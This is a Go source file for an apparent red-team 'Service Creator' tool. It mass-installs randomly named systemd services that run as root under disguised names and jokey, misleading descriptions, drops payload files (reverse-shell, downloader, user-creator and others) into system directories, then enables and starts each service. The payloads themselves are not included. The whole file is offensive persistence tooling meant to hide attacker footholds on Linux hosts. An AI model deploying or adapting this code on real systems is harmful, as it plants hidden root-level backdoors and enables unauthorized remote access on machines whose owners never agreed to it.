//Michael Burke, mdb5315@rit.edu
package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

type service struct {
	name        string
	description string
	path        string
	filename    string
	payload     string
	user        string
}

type servicefile struct {
	contents string
	details  service
}

func (this service) String() string {
	str := "Name: " + this.name +
		"\nDescription: " + this.description +
		"\nPath: " + this.path +
		"\nFile name: " + this.filename +
		"\nPayload: " + this.payload +
		"\nUser: " + this.user
	return str
}

var isDemo bool
var user string
var names, descriptions, paths, filenames, payloads []string

func main() {
	args := os.Args
	isDemo = false
	buildDB()
	numServices := len(names)
	if len(args) > 1 {
		for i := 1; i < len(args); i++ {
			if args[i] == "--demo" {
				isDemo = true
			} else if args[i] == "-n" {
				numServices, _ = strconv.Atoi(args[i+1])
			} else if args[i] == "--help" || args[i] == "-h" {
				fmt.Println("Service Creator\n\n" +
					"--demo		|	Lists generated services, but does not install them\n" +
					"-n [num]	|	Generate n services (default: 32)\n" +
					"--help or -h	|	Display this help menu",
				)
				return
			}
		}
	}
	services := buildServices(numServices)
	services = checkServices(services)
	for i := 0; i < len(services); i++ {
		fmt.Println(services[i].String())
		fmt.Println()
	}
	if !isDemo {
		servicefiles := buildFiles(services)
		createServices(servicefiles)
	}
}

func checkServices(services []service) []service {
	if len(services) != len(names) {
		return services
	}
	types := []string{
		"downloader",
		"random-messenger",
		"file-creator",
		"user-creator",
		"reverse-shell",
	}

	for i := 0; i < len(services); i++ {
		curService := services[i]
		index := findIndex(types, curService.payload)
		if index != -1 {
			fmt.Println(curService.payload + " is fine")
			types, _ = remove(types, index)
		}
	}
	if len(types) != 0 {
		for i := 0; i < len(types); i++ {
			fmt.Println("Caught " + types[i])
			serviceIndex := -1
			for e := 0; e < len(services); e++ {
				if services[e].payload == "sleep" {
					serviceIndex = e
				}
			}
			if serviceIndex == -1 {
				return services
			}
			services[serviceIndex].payload = types[i]
		}
	}
	return services

}

func createServices(files []servicefile) {
	for i := 0; i < len(files); i++ {
		curService := files[i]
		//Create the .service file
		createFile( /*"/etc/systemd/system/"+*/ curService.details.name+".service", curService.contents)
		//Place the playload in the correct location
		copyFile(curService.details.payload, curService.details.path+curService.details.filename)
		enableService := exec.Command("systemctl enable " + curService.details.name + ".service")
		enableService.Run()
		runService := exec.Command("systemctl start " + curService.details.name + ".service")
		runService.Run()
	}
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	if err != nil {
		return err
	}
	return out.Close()
}

func createFile(path, contents string) {
	ioutil.WriteFile(path, []byte(contents), 0644)
}

func buildFiles(services []service) []servicefile {
	var servicefiles []servicefile
	dat, _ := ioutil.ReadFile("template.service")
	template := string(dat)
	for i := 0; i < len(services); i++ {
		service := services[i]
		contents := template
		contents = strings.Replace(contents, "{description}", service.description, 1)
		contents = strings.Replace(contents, "{user}", service.user, 1)
		contents = strings.Replace(contents, "{exec}", service.path+service.filename, 1)
		newServiceFile := servicefile{contents, service}
		servicefiles = append(servicefiles, newServiceFile)
	}
	return servicefiles
}

func buildDB() {
	user = "root"
	names = []string{"yourmom", "freddy-fazbear", "grap", "amogus", "sus", "virus", "redteam", "the-matrix", "uno-reverse-card", "yellowteam", "bingus", "dokidoki", "based", "not-ransomware", "bepis", "roblox", "freevbucks", "notavirus", "heckerman", "benignfile", "yolo", "pickle", "grubhub", "hehe", "amogOS", "society", "yeet", "doge", "mac", "hungy", "youllneverfindme", "red-herring"}
	descriptions = []string{
		"An absolutely vital service for Linux. Do not delete under any circumstances. -redteam",
		"kinda sus bro",
		"Very benign. Much trust.",
		"uhhhhhhh",
		"malware go brrrr",
		"Smudge the crunchy cat",
		"Do me a favor and keep this service running, I have a wife and 4 kids to feed",
		"We've been trying to reach you about your car's extended warranty",
		"hehehehehehehehehehehe",
		"UwU what's this?",
		"Vanessa, I'm a material gorl!",
		"I turned myself into a service Morty! I'm service Rick!",
		"If you or a loved one has been diagnosed with mesothelioma, you may be entitled to a cash reward",
		"It's free real estate",
		"Hot singles in your area",
		"Meesa jar jar binks",
	}
	paths = []string{
		"/var/run/",
		"/var/",
		"/etc/",
		"/home/",
		"/usr/lib/",
		"/usr/local/",
		"/root/",
	}
	filenames = []string{
		"randomservice",
		"inconspicuous_file",
		"deleteme",
		"dontdeleteme",
		"heh",
		"b1ngus",
		"file12345",
		"homework",
		"top-secret",
		"temporary-file",
		"lilboi",
		"geck",
		"flappy-bird-game",
		"borger",
		"issaservice",
		"himom",
		"jeffUwU",
		"youfoundme",
	}
	payloads = []string{
		"downloader",
		"random-messenger",
		"file-creator",
		"file-creator",
		"user-creator",
		"user-creator",
		"reverse-shell",
		"reverse-shell",
		"reverse-shell",
		"sleep",
		"sleep",
		"sleep",
		"sleep",
		"sleep",
		"sleep",
		"sleep",
	}
}

func buildServices(num int) []service {
	validNames := names
	var services []service
	for i := 0; i < num; i++ {
		var serviceName, serviceDesc, servicePath, serviceFilename, servicePayload string
		validNames, serviceName = pickFrom(validNames)
		serviceDesc = getRandom(descriptions)
		servicePath = getRandom(paths)
		serviceFilename = getRandom(filenames)
		servicePayload = getRandom(payloads)
		for {
			if hasCollision(services, servicePath, serviceFilename) {
				servicePath = getRandom(paths)
				serviceFilename = getRandom(filenames)
			} else {
				break
			}
		}
		newService := service{serviceName, serviceDesc, servicePath, serviceFilename, servicePayload, user}
		services = append(services, newService)
	}
	return services
}

func hasCollision(services []service, servicePath string, serviceFilename string) bool {
	for i := 0; i < len(services); i++ {
		curService := services[i]
		if curService.path == servicePath && curService.filename == serviceFilename {
			return true
		}
	}
	return false
}

func pickFrom(slice []string) ([]string, string) {
	var val string
	slice, val = remove(slice, getRandomIndex(slice))
	return slice, val
}

func getRandomIndex(slice []string) int {
	if len(slice) == 1 {
		return 0
	}
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(len(slice) - 1)
}

func getRandom(slice []string) string {
	if len(slice) == 1 {
		return slice[0]
	}
	rand.Seed(time.Now().UnixNano())
	randNum := rand.Intn(len(slice) - 1)
	return slice[randNum]
}

func remove(slice []string, i int) ([]string, string) {
	name := slice[i]
	slice[i] = slice[len(slice)-1]
	slice = slice[:len(slice)-1]
	return slice, name

}

func findIndex(slice []string, value string) int {
	for i := range slice {
		if slice[i] == value {
			return i
		}
	}
	return -1
}
